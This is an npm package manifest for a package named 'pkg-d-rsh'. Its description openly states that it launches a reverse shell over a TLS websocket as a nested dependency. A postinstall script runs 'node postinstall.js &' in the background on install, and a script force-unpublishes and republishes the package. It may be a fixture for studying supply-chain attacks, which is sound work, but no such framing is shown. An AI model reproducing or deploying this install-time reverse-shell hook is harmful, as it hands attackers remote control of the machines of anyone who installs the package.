{
  "name": "pkg-d-rsh",
  "version": "1.0.0",
  "description": "Dependency graph depth 4 that launches a reverse shell over a TLS websocket",
  "main": "index.js",
  "scripts": {
    "postinstall": "node postinstall.js &",
    "pub:refresh": "npm unpublish pkg-d-rsh --force && npm publish",
    "test": "echo \"Error: no test specified\" && exit 1"
  },
  "author": "",
  "license": "ISC",
  "dependencies": {
    "ws": "^8.18.0"
  }
}
